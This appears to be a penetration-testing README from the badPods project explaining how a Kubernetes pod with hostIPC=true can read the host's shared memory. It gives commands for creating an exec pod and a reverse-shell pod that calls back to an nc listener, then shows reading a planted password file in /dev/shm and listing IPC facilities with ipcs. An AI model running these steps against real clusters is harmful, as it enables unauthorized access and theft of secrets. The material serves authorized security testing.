# Bad Pod #7: hostIPC

If you only have `hostIPC=true`, you most likely can't do much. If any process on the host or any processes within another pod is using the host’s inter-process communication mechanisms (shared memory, semaphore arrays, message queues, etc.), you will be able to read/write to those same mechanisms. The first place you'll want to look is `/dev/shm`, as it is shared between any pod with `hostIPC=true` and the host. You'll also want to check out the other IPC mechanisms with `ipcs`.

* **Inspect /dev/shm** - Look for any files in this shared memory location. 
* **Inspect existing IPC facilities** – You can check to see if any IPC facilities are being used with `/usr/bin/ipcs`. 
# Pod Creation
## Create a pod you can exec into
Create pod
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostipc/pod/hostipc-exec-pod.yaml 
```
Exec into pod 
```bash
kubectl exec -it hostipc-exec-pod -- bash
```

## Reverse shell pod

Set up listener
```bash
nc -nvlp 3116
```

Create pod from local manifest without modifying it by using env variables and envsubst
```bash
HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/pod/hostipc/pod/hostipc-revshell-pod.yaml | kubectl apply -f -
```

Catch the shell
```bash
$ nc -nvlp 3116
Listening on 0.0.0.0 3116
Connection received on 10.0.0.162 42035
```

# Post exploitation 

#### Inspect /dev/shm - Look for any files in this shared memory location.

For a super simple POC, I have created a secret file in /dev/shm on the worker node"
```
root@k8s-worker:/# echo "secretpassword=BishopFox" > /dev/shm/secretpassword.txt
```


List all files in /dev/shm
```
root@hostipc-exec-pod:/# ls -al /dev/shm/
total 4
drwxrwxrwt 3 root root  80 Dec 22 15:11 .
drwxr-xr-x 5 root root 360 Dec 21 20:01 ..
drwx------ 4 root root  80 Sep  9 20:10 multipath
-rw-r--r-- 1 root root  25 Dec 22 15:11 secretpassword.txt
```

Check out any interesting files
```
root@hostipc-exec-pod:/# cat /dev/shm/secretpassword.txt
secretpassword=BishopFox
```

#### Look for any use of inter-process communication on the host 
```bash
ipcs -a
```

#### Attacks that apply to all pods, even without any special permissions
* Cloud metadata service
* `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
* Kubernetes exploits
* Hunting for vulnerable application/services in the cluster

# Demonstrate Impact
If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test.

# Reference(s): 
* https://opensource.com/article/20/1/inter-process-communication-linux
